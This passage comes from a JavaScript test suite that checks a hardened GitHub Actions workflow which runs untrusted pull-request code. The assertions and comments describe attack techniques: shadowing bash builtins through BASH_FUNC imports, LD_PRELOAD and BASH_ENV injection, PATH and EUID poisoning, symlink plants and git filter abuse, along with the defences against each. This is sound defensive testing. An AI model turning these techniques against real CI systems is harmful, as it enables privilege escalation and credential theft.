    const saveStep = saveJob.steps.find((s) =>
      s.uses?.startsWith('actions/cache/save@'),
    );
    assert.ok(saveStep, 'must have an actions/cache/save step');
    for (const [jobName, jobDef] of [
      ['verify', verifyJob],
      ['tmux-testing', tmuxJob],
    ]) {
      const restoreStep = jobDef.steps.find(
        (s) => s.name === 'Restore npm cache',
      );
      assert.equal(
        saveStep.with.path,
        restoreStep.with.path,
        `cache path must match ${jobName} restore path`,
      );
      assert.equal(
        saveStep.with.key,
        restoreStep.with.key,
        `cache key must match ${jobName} restore key`,
      );
    }
  });

  it('populates the cache directory it saves', () => {
    const saveStep = saveJob.steps.find((s) =>
      s.uses?.startsWith('actions/cache/save@'),
    );
    assert.ok(saveStep, 'must have an actions/cache/save step');
    const dir = saveStep.with.path.replace(
      /^\$\{\{\s*runner\.temp\s*\}\}\//,
      '',
    );
    assert.ok(dir, 'save path must resolve to a directory name');
    const populateStep = saveJob.steps.find(
      (s) => s.name === 'Populate npm cache',
    );
    assert.ok(populateStep, "'Populate npm cache' step must exist");
    assert.ok(
      populateStep.run.includes(`--cache "$RUNNER_TEMP/${dir}"`),
      `populate step must fill the saved cache directory (--cache "$RUNNER_TEMP/${dir}")`,
    );
  });

  it('runs on the same target as the consumers so the cache version matches', () => {
    // actions/cache scopes an entry by a hash of the literal cache path plus
    // the compression method. A producer on a different runner or outside the
    // container image computes a different version, so every restore misses
    // even when the key and path strings match — pin runs-on + image to the
    // consumers' so both match by construction.
    for (const [jobName, jobDef] of [
      ['verify', verifyJob],
      ['tmux-testing', tmuxJob],
    ]) {
      assert.deepEqual(
        saveJob['runs-on'],
        jobDef['runs-on'],
        `producer runs-on must match ${jobName}`,
      );
      assert.equal(
        saveJob.container.image,
        jobDef.container.image,
        `producer container image must match ${jobName}`,
      );
    }
    assert.equal(
      saveJob.container.options,
      '--init --user node',
      'producer must not leave root-owned files on the self-hosted runner',
    );
  });
});

describe('qwen-triage: flakiness gate (#9125)', () => {
  const recordStep = verifyJob.steps.find(
    (s) => s.name === 'Record changed test files for the flakiness gate',
  );
  const flakeStep = verifyJob.steps.find((s) => s.id === 'flake');
  const prepareStep = verifyJob.steps.find(
    (s) => s.name === 'Install and build PR app',
  );
  const agentStep = verifyJob.steps.find(
    (s) => s.name === 'Run verification agent',
  );
  const publishStep = doc.jobs['publish-verify'].steps.find(
    (s) => s.name === 'Post verification report comment',
  );
  // Round 11 (R8-35): the runner applies file commands a step's PR code
  // wrote to the uid-1000-owned backing files at step end, so a
  // root-side block's inherited PATH may be attacker-poisoned; each
  // block this PR adds pins a root-only-writable one before resolving
  // bare binaries. The EUID gate keeps the harness's stub PATH intact.
  const pathPinRe =
    /^\s*if \[\[ \$\{EUID:-1\} -eq 0 \]\]; then\n\s*export PATH='\/usr\/local\/sbin:\/usr\/local\/bin:\/usr\/sbin:\/usr\/bin:\/sbin:\/bin'\n\s*fi$/m;
  // R15-1: the pre-exec decisions are reserved words — bash imports a
  // BASH_FUNC_[%% env entry as a FUNCTION named `[`, and function lookup
  // precedes builtins, so a `[`-shaped guard is itself hijackable
  // (probe-verified on this pool's bash). R14-2: the child runs the body
  // the parent snapshotted — the runner wrote the script node-owned in
  // the uid-1000-writable $RUNNER_TEMP, so a second open by the child is
  // a plant window.
  // R18-4: the identity conjunct queries the kernel through an absolute
  // path — bash imports $EUID from the process environment, overriding
  // the native readonly variable, so an EUID line planted through the
  // uid-1000 file-command channel would skip every root-gated defence.
  const scrubRefusalRe =
    /^\s*if \[\[ \$\(\/usr\/bin\/id -u\) -eq 0 \]\] && \[\[ -n \$\{BASH_ENV:-\} \|\| -n \$\{LD_PRELOAD:-\} \|\| -n \$\{LD_AUDIT:-\} \|\| -n \$\{LD_LIBRARY_PATH:-\} \]\]; then$/m;
  const reExecRe =
    /case "\$\{1:-\}" in[\s\S]*?--flake-clean-child\) ;;[\s\S]*?_flake_body="\$\(<"\$\{BASH_SOURCE\[0\]\}"\)"[\s\S]*?LD_PRELOAD= LD_AUDIT= LD_LIBRARY_PATH= exec \/usr\/bin\/env -i[\s\S]*?\/usr\/bin\/bash --noprofile --norc -e -o pipefail -c "\$_flake_body" \S+ --flake-clean-child/;
  const reExecMarkerRe = /case "\$\{1:-\}" in/;
  const pathChildRe = /"\$\{BASH_SOURCE\[0\]\}" --flake-clean-child/;
  // R15-1: POSIX mode resolves special builtins before functions, so the
  // re-exec's `exec` and every refusal's `exit` cannot be shadowed by a
  // BASH_FUNC_* import the way bare builtins can (probe-verified on this
  // pool's bash). `set` is itself shadowable, so the switch is verified
  // with a reserved word, and the refusal ends in a slash-pathed kill of
  // last resort for the case where `exit` is shadowed too.
  const posixSwitchRe = /^\s*set -o posix\n\s*if \[\[ ! -o posix \]\]; then$/m;
  const posixKillRe = /exit [01]\n\s*\/usr\/bin\/kill -9 \$\$\n\s*fi/;

  it('records the changed-test list BEFORE the workspace is handed to the build user', () => {
    assert.ok(recordStep, 'record step must exist');
    assert.ok(flakeStep, 'flake gate step must exist');
    const recordIdx = verifyJob.steps.indexOf(recordStep);
    const prepareIdx = verifyJob.steps.indexOf(prepareStep);
    const flakeIdx = verifyJob.steps.indexOf(flakeStep);
    // After npm ci, PR lifecycle code owns .git and could rewrite the diff
    // to hide a test file — the list must be pinned while .git is still
    // root-owned, and the gate must consume that pinned list after the build.
    assert.ok(
      recordIdx < prepareIdx,
      'the list must be recorded before install/build runs PR lifecycle code',
    );
    assert.ok(
      prepareIdx < flakeIdx,
      'the gate needs node_modules, so it must run after install/build',
    );
    // And before the agent: the sampled tree must be the built tree the
    // agent verifies, not one the agent era has already mutated.
    assert.ok(
      flakeIdx < verifyJob.steps.indexOf(agentStep),
      'the gate must sample before the agent runs',
    );
    // The record step must fire on every run the gate can fire on — a
    // narrower `if:` here silently starves the gate into `error`.
    assert.equal(
      recordStep.if,
      "steps.pr.outputs.decision == 'run'",
      'the record step must run whenever the lane runs',
    );
    // NUL-delimited end to end (round 5): quotePath=false only stops
    // quoting of bytes >= 0x80; ASCII specials (backslash, tab, quote,
    // control chars) stay C-quoted and silently failed a $-anchored line
    // grep. Exact-line pins: the git statement must stand alone (a
    // pipeline or a command substitution would swallow the exit status or
    // the NUL bytes respectively), and the grep must read the file and
    // carry the full extension set (.mts/.cts included — vitest's default
    // include collects them).
    // Adjacency-pinned as WHOLE statements (round 6): pinning the git line
    // and its redirect as independent shapes let an interposed pipeline
    // stage satisfy both.
    // T included: a typechange (symlink→regular) changes what the runner
    // executes, so it is a changed test file exactly like M.
    assert.match(
      recordStep.run,
      /^\s*\/usr\/bin\/git -c core\.quotePath=false diff -z --name-only --diff-filter=ACMRT "\$BASE_OID" HEAD \\\n\s*> "\$\{RUNNER_TEMP:\?\}\/flake-record-files-all"$/m,
      'the NUL diff must flow straight into its file — $( ) strips NUL bytes, a pipeline swallows the exit status',
    );
    assert.match(
      recordStep.run,
      /^\s*rm -rf -- "\$\{RUNNER_TEMP:\?\}\/flake-record-files-all"\n\s*\/usr\/bin\/git -c core\.quotePath=false diff -z/m,
      'the staging path must be unlinked immediately before the redirect — a planted symlink or directory there makes root write through it or hard-fail the record step',
    );
    assert.match(
      recordStep.run,
      /^\s*BASE_OID="\$\(\/usr\/bin\/cat "\$\{RUNNER_TEMP:\?\}\/verify-base-oid"\)"$/m,
      'the record step must diff against the base OID captured while .git was root-owned, not re-resolve HEAD^1',
    );
    assert.match(
      recordStep.run,
      /^\s*case "\$BASE_OID" in$/m,
      'the base OID must be shape-validated in the parent arm before the diff',
    );
    assert.match(
      recordStep.run,
      /^\s*\[0-9a-f\]\[0-9a-f\]\[0-9a-f\]\[0-9a-f\]\[0-9a-f\]\[0-9a-f\]\[0-9a-f\]\[0-9a-f\]\*\) ;;/m,
      'the base OID shape must be an 8+-hex prefix — a planted valid OID would yield an empty diff and starve the gate into n/a',
    );
    assert.match(
      recordStep.run,
      /^\s*cp "\$\{RUNNER_TEMP:\?\}\/flake-record-files-all" "\$GATE_HOME\/files-all"$/m,
      'the scrubbed child must copy the parent-recorded diff, never re-run git under env -i',
    );
    const recordDiffAt = recordStep.run.search(/^\s*\/usr\/bin\/git -c core\.quotePath=false diff -z/m);
    const recordReExecAt = recordStep.run.search(/exec \/usr\/bin\/env -i/);
    const recordCpAt = recordStep.run.search(/^\s*cp "\$\{RUNNER_TEMP:\?\}\/flake-record-files-all" "\$GATE_HOME\/files-all"$/m);
    const recordInstallAt = recordStep.run.search(/^\s*install -d -m 0700 -o root -g root "\$GATE_HOME"$/m);
    assert.ok(
      recordDiffAt !== -1 && recordReExecAt !== -1 && recordCpAt !== -1 && recordInstallAt !== -1 &&
        recordDiffAt < recordReExecAt && recordReExecAt < recordInstallAt && recordInstallAt < recordCpAt,
      'the diff must be recorded in the parent arm before the env -i re-exec, and copied into the recreated root-only home',
    );
    // The scrubbed child must never re-run git under env -i: the ordering
    // pin uses first-match semantics, so it cannot by itself forbid a
    // second git in the child. Strip comments first (the child's own docs
    // name `git diff` when describing what NOT to do) before asserting.
    assert.doesNotMatch(
      recordStep.run.slice(recordReExecAt).replace(/^\s*#.*$/gm, '').replace(/\\\n/g, ' '),
      /\bgit\b[^\n]*\b(diff|log|show|whatchanged)\b/,
      'the scrubbed child must never re-run git under env -i — that is the failure shape of run 32227155960',
    );
    assert.ok(
      recordStep.run.includes(
        "grep -zE '\\.(test|spec)\\.(ts|tsx|js|jsx|mjs|cjs|mts|cts)$'",
      ),
      'the NUL-record grep must carry the full extension set',
    );
    assert.match(
      recordStep.run,
      /^\s*grep_status=0\n\s*grep -zE '[^']+' \\\n\s*"\$GATE_HOME\/files-all" \\\n\s*> "\$GATE_HOME\/files" \|\| grep_status=\$\?$/m,
      'the grep must read the raw file and only a no-match may yield an empty list',
    );
    // Every gate working file must live in the root-only home, because
    // $RUNNER_TEMP's top level is uid-1000 writable on this pool and the
    // container's `node` is uid 1000: files there can be unlinked and
    // replaced with symlinks that root-side consumers follow.
    assert.match(
      recordStep.run,
      /^\s*install -d -m 0700 -o root -g root "\$GATE_HOME"$/m,
      'the record step must create the root-only home',
    );
    assert.match(
      recordStep.run,
      /^\s*rm -rf -- "\$GATE_HOME"$/m,
      'a plant left by an earlier run on the persistent pool must be removed first',
    );
    // Run-freshness marker: a stale-but-genuine home from an earlier
    // run on the persistent pool passes every ownership/mode/shape
    // check — only this marker lets the always() staging step tell
    // runs apart when the record step itself was skipped.
    assert.match(
      recordStep.run,
      /^\s*printf '%s-%s' "\$\{GITHUB_RUN_ID:\?\}" "\$\{GITHUB_RUN_ATTEMPT:\?\}" > "\$GATE_HOME\/run-id"$/m,
      'the record step must stamp the run identity into the home it creates',
    );
    // Startup-channel scrub: BASH_FUNC_* imports are dropped by a
    // one-shot env -i re-exec whose child marker is POSITIONAL — an
    // env-borne sentinel would be forgeable through the very
    // file-command channel the scrub defends against.
    assert.match(
      recordStep.run,
      reExecRe,
      'the record step must re-exec through env -i with a positional child marker, an absolute-path bash operand, and the parent-snapshotted body',
    );
    assert.doesNotMatch(
      recordStep.run,
      pathChildRe,
      'the re-exec child must never re-open the script by path — the second open is the plant window',
    );
    assert.match(
      recordStep.run,
      scrubRefusalRe,
      'the record step scrub refusal must be reserved-word shaped — `[` is shadowable by a BASH_FUNC import',
    );
    assert.match(
      recordStep.run,
      /survivors="\$\(\/usr\/bin\/ps -o pid=,stat= -u node 2>\/dev\/null \| \/usr\/bin\/awk '\$2 !~ \/\^Z\/'\)" \|\| true\n\s*if \[\[ -n \$survivors \]\]; then\n\s*\/usr\/bin\/printf '::error::flake-gate record:[\s\S]*?\\n'\n\s*exit 1/,
      'the record step kill must be liveness-verified — the budget loop alone is out-forked between sweeps',
    );
    const recordKill = recordStep.run.search(/survivors="\$\(\/usr\/bin\/ps/);
    const recordReExec = recordStep.run.search(reExecMarkerRe);
    assert.ok(
      recordKill !== -1 && recordReExec !== -1 && recordKill < recordReExec,
      'node survivors must be killed BEFORE the re-exec snapshot re-reads this script from disk',
    );
    assert.doesNotMatch(
      recordStep.run,
      /_FLAKE_CLEAN_REEXEC/,
      'the re-exec child marker must never be an env entry — env markers are forgeable via the file-command channel',
    );
    assert.match(
      recordStep.run,
      pathPinRe,
      'the record step must pin a root-only-writable PATH — its inherited one may be poisoned through the file-command backing files',
    );
    // R15-1: `exec` and `exit` are builtins and function lookup precedes
    // builtins — a BASH_FUNC_exec%% import shadows the re-exec keyword and
    // the poisoned parent falls through with every import alive
    // (probe-verified on this pool's bash). POSIX mode resolves special
    // builtins before functions, closing the class for `exec`, `exit` and
    // every refusal; the switch must precede the first refusal it
    // immunizes.
    assert.match(
      recordStep.run,
      posixSwitchRe,
      'the record step must enter POSIX mode so exec/exit cannot be shadowed by a BASH_FUNC import',
    );
    assert.match(
      recordStep.run,
      posixKillRe,
      'the posix refusal must end in a slash-pathed kill — exit itself may be the shadowed builtin',
    );
    const recordPosix = recordStep.run.search(/^\s*set -o posix$/m);
    const recordScrub = recordStep.run.search(scrubRefusalRe);
    assert.ok(
      recordPosix !== -1 && recordScrub !== -1 && recordPosix < recordScrub,
      'the POSIX switch must precede the first refusal whose exit it immunizes',
    );
    // A grep ERROR (status 2 — e.g. ENOSPC opening the output) is
    // infrastructure: swallowing it narrows the gate to zero files and
    // starves it into n/a, so it must fail the record step loudly.
    assert.match(
      recordStep.run,
      /^\s*if \[ "\$grep_status" -gt 1 \]; then\n\s*echo "[^"]*" >&2\n\s*exit 1\n\s*fi$/m,
      'a grep error must fail the record step loudly — never narrow the gate silently',
    );
    // Continuation-collapsed (round 6): a `\⏎|` split pipeline is still a
    // pipeline.
    assert.doesNotMatch(
      recordStep.run
        .replace(/\\\n/g, ' ')
        .split('\n')
        .filter((l) => !l.trim().startsWith('#'))
        .join('\n'),
      /git[^\n]*diff[^\n]*\|/,
      'a git failure must never be swallowable by a pipeline',
    );
    assert.match(
      flakeStep.run,
      /read -r -d '' f/,
      'the gate must consume the list NUL-delimited — the one framing a filename cannot break',
    );
    // The owning-package walk must hand its result back through a
    // variable, never a `$( )` capture: command substitution strips
    // trailing newlines, corrupting a package dir that ends in one (the
    // NUL intake admits such names).
    assert.doesNotMatch(
      flakeStep.run,
      /\$\(owning_pkg_dir/,
      'the owning-package walk must not be captured through $( )',
    );
    assert.match(
      flakeStep.run,
      /^\s*pkg="\$OWNING_PKG_DIR"$/m,
      'the walk result must flow through a variable, not stdout',
    );
    // Word-based and continuation-proof (round 5): `git -c … diff`, a
    // backslash-continued `git \⏎ diff`, and log/show/whatchanged
    // --name-only are all re-derivations. The gate's own `git checkout`/
    // `git clean` reset lines stay legal.
    assert.doesNotMatch(
      flakeStep.run.replace(/\\\n/g, ' '),
      /\bgit\b[^\n]*\bdiff\b/,
      'the gate must not re-derive the diff from post-build git metadata in any spelling',
    );
    assert.doesNotMatch(
      flakeStep.run.replace(/\\\n/g, ' '),
      /\bgit\b[^\n]*\b(log|show|whatchanged)\b[^\n]*--name-only/,
      'nor via history-walking verbs',
    );
  });

  it('round-19 startup hardening: kernel identity, POSIX-from-invocation, pathed refusal writes, inode-anchored snapshot', () => {
    const stageStep = verifyJob.steps.find(
      (s) => s.name === 'Stage flakiness gate log for upload',
    );
    const recheckStep = verifyJob.steps.find(
      (s) => s.id === 'flake-upload-check',
    );
    const scrubbedSteps = [
      ['record', recordStep],
      ['gate', flakeStep],
      ['staging', stageStep],
      ['re-check', recheckStep],
    ];
    // R18-2: POSIXLY_CORRECT in the step env puts bash in POSIX mode at
    // INVOCATION — a BASH_FUNC_* import named after a special builtin is
    // refused at import (probe-verified: without it, a poisoned `set`
    // runs attacker code on the body's first command and can even enable
    // posix itself to slip past the reserved-word refusal).
    for (const [label, step] of scrubbedSteps) {
      assert.equal(
        step.env.POSIXLY_CORRECT,
        '1',
        `${label}: POSIXLY_CORRECT must make bash POSIX-mode before the body's first shadowable command`,
      );
    }
    // R18-4: parent-side identity comes from the kernel — $EUID is
    // imported from the process environment (probe-verified: a planted
    // EUID skips or fires the gate at will; blanking cannot restore it,
    // set-but-empty reads as unset). The record/gate/staging PATH pins
    // run INSIDE the env -i child where imports are wiped and EUID is
    // the native readonly — only the parent-side gates are pinned here.
    const preReExec = (run) => run.slice(0, run.search(reExecMarkerRe));
    for (const [label, step] of [
      ['record', recordStep],
      ['gate', flakeStep],
      ['staging', stageStep],
    ]) {
      assert.doesNotMatch(
        preReExec(step.run),
        /\$\{EUID/,
        `${label}: parent-side identity must not read $EUID — the poisoned file-command channel can import it`,
      );
    }
    assert.doesNotMatch(
      recheckStep.run,
      /\$\{EUID/,
      're-check identity must not read $EUID — the step has no env -i re-exec, so it runs in the inherited job environment',
    );
    assert.match(
      recheckStep.run,
      /^\s*if \[\[ \$\(\/usr\/bin\/id -u\) -eq 0 \]\]; then\n\s*export PATH='/m,
      'the re-check PATH pin must key on the kernel identity too',
    );
    // R18-3: every pre-re-exec refusal write goes through slash-pathed
    // printf — echo is a REGULAR builtin, shadowable by a BASH_FUNC
    // import even in POSIX mode (probe-verified; the mechanism pin lives
    // in the behavioral suite), and the refusal path runs in exactly the
    // poisoned environment the refusals detect.
    for (const [label, section] of [
      ['record', preReExec(recordStep.run)],
      ['gate', preReExec(flakeStep.run)],
      ['staging', preReExec(stageStep.run)],
      ['re-check', recheckStep.run],
    ]) {
      assert.doesNotMatch(
        section,
        /^\s*echo /m,
        `${label}: no bare echo before the env -i re-exec — BASH_FUNC_echo%% shadows it even in POSIX mode`,
      );
    }
    // R18-1: the re-exec snapshot is anchored to the inode bash is
    // executing (fd 255) — a swap that lands between bash's open of the
    // runner-written step script and the snapshot is filesystem state a
    // kill cannot un-land, and the path re-open would read the plant.
    // Capture precedes the snapshot, the check precedes the exec.
    const inodeAnchorRe =
      /_flake_self_id="\$\(\/usr\/bin\/stat -L -c '%d:%i' "\/proc\/\$\$\/fd\/255" 2>\/dev\/null\)" \|\| _flake_self_id=''[\s\S]*?_flake_body="\$\(<"\$\{BASH_SOURCE\[0\]\}"\)"[\s\S]*?if \[\[ -z \$_flake_self_id \]\] \|\|\n\s*\[\[ "\$\(\/usr\/bin\/stat -L -c '%d:%i' "\$\{BASH_SOURCE\[0\]\}" 2>\/dev\/null\)" != "\$_flake_self_id" \]\]; then/;
    for (const [label, step] of [
      ['record', recordStep],
      ['gate', flakeStep],
      ['staging', stageStep],
    ]) {
      assert.match(
        step.run,
        inodeAnchorRe,
        `${label}: the re-exec snapshot must be anchored to the inode bash is executing, re-verified after the snapshot, before the exec`,
      );
      const killAt = step.run.search(/\/usr\/bin\/pkill -KILL -u node/);
      const reExecAt = step.run.search(reExecMarkerRe);
      const anchorAt = step.run.search(/_flake_self_id="\$\(\/usr\/bin\/stat/);
      assert.ok(
        killAt !== -1 &&
          reExecAt !== -1 &&
          anchorAt !== -1 &&
          killAt < reExecAt &&
          reExecAt < anchorAt,
        `${label}: the anchor sits inside the parent re-exec arm, after the kill`,
      );
    }
  });

  it('runs PR test code as the build user with no tokens, and fails open', () => {
    assert.equal(flakeStep.env.GITHUB_TOKEN, '', 'no GitHub token in the gate');
    assert.equal(flakeStep.env.GH_TOKEN, '', 'no gh token in the gate');
    // Line-anchored (round-4 R2-P1): an unanchored substring is satisfied
    // by a comment while the invocation itself runs as root — and this one
    // line also pins the per-invocation `timeout` cap, without which a
    // single hung test holds the invocation to the job timeout's SIGKILL,
    // which the EXIT-trap fail-open cannot survive.
    assert.match(
      flakeStep.run,
      /^\s*timeout -k 30 600 runuser -u node -- \\$/m,
      'PR test code must run as the build user under the per-invocation timeout cap',
    );
    // Presence AND position: the strip must precede the first invocation,
    // or the credentials are already in the child env when PR code runs.
    const unsetIdx = flakeStep.run.search(
      /^\s*unset ACTIONS_RUNTIME_TOKEN ACTIONS_RUNTIME_URL ACTIONS_CACHE_URL$/m,
    );
    const firstInvocation = flakeStep.run.search(
      /^\s*timeout -k 30 600 runuser -u node -- \\$/m,
    );
    assert.ok(
      unsetIdx !== -1 && firstInvocation !== -1 && unsetIdx < firstInvocation,
      'cache-service credentials must be stripped before PR test code runs',
    );
    assert.match(
      flakeStep.run,
      /env -u GITHUB_OUTPUT -u GITHUB_STATE -u GITHUB_ENV -u GITHUB_PATH -u GITHUB_STEP_SUMMARY/,
      'runner-injection files must be invisible to PR test code',
    );
    // Whole-env pin: any future secret added to this step env reaches
    // process.env of PR test code, so it must be an explicit test
    // decision. BASH_ENV/LD_PRELOAD/LD_AUDIT/LD_LIBRARY_PATH are the
    // defensive startup-channel blanks (consumed at shell/loader startup,
    // before any in-script defence) — blanks, never secrets.
    // POSIXLY_CORRECT is the round-19 startup defence: POSIX mode at
    // INVOCATION refuses BASH_FUNC_* imports named after special
    // builtins, so a poisoned `set` cannot run on the body's first
    // command (see the behavioral poison scenario below).
    assert.deepEqual(
      Object.keys(flakeStep.env).sort(),
      [
        'BASH_ENV',
        'FLAKE_ROUNDS',
        'GH_TOKEN',
        'GITHUB_TOKEN',
        'LD_AUDIT',
        'LD_LIBRARY_PATH',
        'LD_PRELOAD',
        'POSIXLY_CORRECT',
      ],
      'the gate env must stay tokens-blanked and secret-free',
    );
    // Startup-channel scrub: BASH_FUNC_* imports are dropped by a
    // one-shot env -i re-exec whose child marker is POSITIONAL — an
    // env-borne sentinel would be forgeable through the very
    // file-command channel the scrub defends against.
    assert.match(
      flakeStep.run,
      reExecRe,
      'the gate must re-exec through env -i with a positional child marker, an absolute-path bash operand, and the parent-snapshotted body',
    );
    assert.doesNotMatch(
      flakeStep.run,
      pathChildRe,
      'the re-exec child must never re-open the script by path — the second open is the plant window',
    );
    assert.doesNotMatch(
      flakeStep.run,
      /_FLAKE_CLEAN_REEXEC/,
      'the re-exec child marker must never be an env entry — env markers are forgeable via the file-command channel',
    );
    assert.match(
      flakeStep.run,
      scrubRefusalRe,
      'the gate scrub refusal must be reserved-word shaped — `[` is shadowable by a BASH_FUNC import',
    );
    // R15-1: same discipline as the record step — the gate's fail-open
    // refusals ride the same exit channel.
    assert.match(
      flakeStep.run,
      posixSwitchRe,
      'the gate must enter POSIX mode so exec/exit cannot be shadowed by a BASH_FUNC import',
    );
    assert.match(
      flakeStep.run,
      posixKillRe,
      'the posix refusal must end in a slash-pathed kill — exit itself may be the shadowed builtin',
    );
    const gatePosix = flakeStep.run.search(/^\s*set -o posix$/m);
    const gateScrub = flakeStep.run.search(scrubRefusalRe);
    assert.ok(
      gatePosix !== -1 && gateScrub !== -1 && gatePosix < gateScrub,
      'the POSIX switch must precede the first refusal whose exit it immunizes',
    );
    // R14-2/R12-2: the runner writes this script as a node-owned file
    // inside the uid-1000-writable $RUNNER_TEMP — a detached
    // install/build survivor still alive at the re-exec snapshot
    // overwrites the file in place and the wrapper executes attacker
    // content in its full environment. The kill must precede the
    // snapshot, absolute-pathed (no PATH pin applies this early),
    // EUID-gated (the harness stays on its stubs), and liveness-
    // verified with a fail-open refusal (the agent-step guard shape):
    // the budget loop alone is out-forked by a plant repopulating
    // between sweeps.
    const gatePreKill = flakeStep.run.search(
      /^\s*if \[\[ \$\(\/usr\/bin\/id -u\) -eq 0 \]\]; then\n\s*\/usr\/bin\/pkill -KILL -u node 2>\/dev\/null \|\| true\n\s*for _ in 1 2 3; do\n\s*\[\[ -n \$\(\/usr\/bin\/ps -o pid=,stat= -u node 2>\/dev\/null \| \/usr\/bin\/awk '\$2 !~ \/\^Z\/'\) \]\] \|\| break\n\s*\/usr\/bin\/sleep 1\n\s*\/usr\/bin\/pkill -KILL -u node 2>\/dev\/null \|\| true\n\s*done\n\s*survivors="\$\(\/usr\/bin\/ps -o pid=,stat= -u node 2>\/dev\/null \| \/usr\/bin\/awk '\$2 !~ \/\^Z\/'\)" \|\| true\n\s*if \[\[ -n \$survivors \]\]; then\n\s*\/usr\/bin\/printf 'flake_verdict=%s\\n' error >> "\$GITHUB_OUTPUT"\n\s*\/usr\/bin\/printf 'flake_summary=%s\\n' 'node-owned processes survived SIGKILL — the gate refused to sample' >> "\$GITHUB_OUTPUT"\n\s*exit 0\n\s*fi\n\s*fi$/m,
    );
    const gateReExec = flakeStep.run.search(reExecMarkerRe);
    assert.ok(
      gatePreKill !== -1 && gateReExec !== -1 && gatePreKill < gateReExec,
      'node survivors must be killed (and their absence verified) BEFORE the re-exec snapshot re-reads this script from disk',
    );
    // Actions merges workflow- and job-level env into every step: the
    // step-key pin above is only exhaustive while those levels stay empty.
    assert.equal(doc.env, undefined, 'no workflow-level env may appear');
    assert.equal(
      verifyJob.env,
      undefined,
      'no verify-job-level env may appear — it would flow into the gate',
    );
    // Keys AND the one non-blank value: FLAKE_ROUNDS must come from the
    // repo variable, not a hardcoded count or a PR-influenced expression.
    assert.equal(
      flakeStep.env.FLAKE_ROUNDS,
      '${{ vars.QWEN_VERIFY_FLAKE_ROUNDS }}',
      'round count must be operator-controlled',
    );
    assert.match(
      flakeStep.run,
      /NODE_OPTIONS='--max-old-space-size=3072' CI=true HOME="\$inv_tmp" TMPDIR="\$inv_tmp"/,
      'child env must pin CI parity, the heap limit, and the per-invocation HOME/TMPDIR — dotfile/XDG state must not leak across samples',
    );
    // The per-invocation temp dir must be recreated fresh and handed to
    // the build user — a shared or stale TMPDIR is exactly the cross-round
    // cache leakage the reset exists to prevent.
    assert.match(
      flakeStep.run,
      /^\s*rm -rf "\$inv_tmp"$/m,
      'inv_tmp must be flushed per invocation',
    );
    assert.match(
      flakeStep.run,
      /^\s*mkdir -p "\$inv_tmp"$/m,
      'inv_tmp must be recreated per invocation',
    );
    assert.match(
      flakeStep.run,
      /^\s*chown -h node:node "\$inv_tmp"$/m,
      'inv_tmp must be writable by the build user, and -h must never dereference a planted symlink into an ownership takeover of its target',
    );
    assert.match(
      flakeStep.run,
      /^\s*set -uo pipefail/m,
      'the gate must not opt into -e',
    );
    // The runner wraps run: blocks in `bash -e -o pipefail`, and `set -uo`
    // does NOT clear that inherited -e — only an explicit `set +e` does.
    // Without it the first failing test invocation kills the step (round-1
    // sandboxed verify blocker), and the behavioral suite below proves the
    // same end to end under the wrapper.
    assert.match(
      flakeStep.run,
      /^\s*set \+e$/m,
      'the gate must explicitly clear the runner wrapper -e',
    );
    assert.match(
      flakeStep.run,
      /trap on_gate_exit EXIT/,
      'abnormal exits (set -u deaths) must be converted to the error verdict',
    );
    assert.doesNotMatch(
      flakeStep.run,
      /set -euo/,
      'a gate bug must fail OPEN (verdict error), never abort the verify job',
    );
    // Round-4 Critical: the reset must run AS THE BUILD USER — a root
    // checkout restores node-mutated tracked files as new root-owned
    // inodes that later node rounds cannot write (EACCES divergence) —
    // and must also drop untracked residue (`git clean -ffd`, no -x so
    // gitignored node_modules/dist survive). Line-anchored: a comment
    // cannot satisfy these.
    // Round-7 hardening of both calls: `-ffd` because plain -fd by
    // documented git behavior refuses untracked dirs holding a nested
    // .git, and the lane's runner-injection strip plus a timeout
    // wrapper (a planted filter can hang them, and the reset runs
    // outside the invocation loop's deadline check).
    // Round 11: the restore is `git reset --hard` to the OID pinned
    // before the loop (R4-1: a test can commit mid-invocation and move
    // HEAD; restoring from HEAD would make the committed mutation the
    // baseline, and a pathspec checkout would keep files the moved HEAD
    // added); the reset sanitizes .git's execution vectors first (R4-2:
    // a planted smudge filter otherwise runs inside the restore
    // itself); it returns its exit code to the callers (R8-9: a
    // failure after samples must stop the sampling, not discard the
    // verdict); and the kill runs again after the git calls (R8-10:
    // they respawn PR-planted filters/hooks as node, and nothing
    // node-owned may be alive when root touches $RUNNER_TEMP paths
    // afterwards).
    const resetRestoreRe =
      /^\s*timeout -k 30 120 runuser -u node -- env -u GITHUB_OUTPUT -u GITHUB_STATE -u GITHUB_ENV -u GITHUB_PATH -u GITHUB_STEP_SUMMARY \\\n\s*-u GIT_DIR -u GIT_WORK_TREE -u GIT_COMMON_DIR -u GIT_INDEX_FILE -u GIT_OBJECT_DIRECTORY -u GIT_ALTERNATE_OBJECT_DIRECTORIES -u GIT_SHALLOW_FILE -u GIT_EXEC_PATH -u GIT_CONFIG_COUNT -u GIT_CONFIG_PARAMETERS -u GIT_ALLOW_PROTOCOL -u GIT_PROXY_COMMAND -u GIT_SSL_NO_VERIFY -u GIT_SSL_CAINFO -u GIT_ASKPASS -u GIT_SSH -u GIT_SSH_COMMAND \\\n\s*git reset --hard "\$PINNED_OID" 2>\/dev\/null \|\| reset_rc=\$\?$/m;
    const resetCleanRe =
      /^\s*timeout -k 30 120 runuser -u node -- env -u GITHUB_OUTPUT -u GITHUB_STATE -u GITHUB_ENV -u GITHUB_PATH -u GITHUB_STEP_SUMMARY \\\n\s*-u GIT_DIR -u GIT_WORK_TREE -u GIT_COMMON_DIR -u GIT_INDEX_FILE -u GIT_OBJECT_DIRECTORY -u GIT_ALTERNATE_OBJECT_DIRECTORIES -u GIT_SHALLOW_FILE -u GIT_EXEC_PATH -u GIT_CONFIG_COUNT -u GIT_CONFIG_PARAMETERS -u GIT_ALLOW_PROTOCOL -u GIT_PROXY_COMMAND -u GIT_SSL_NO_VERIFY -u GIT_SSL_CAINFO -u GIT_ASKPASS -u GIT_SSH -u GIT_SSH_COMMAND \\\n\s*git clean -ffd 2>\/dev\/null \|\| reset_rc=\$\?$/m;
    const sanitizeRe =
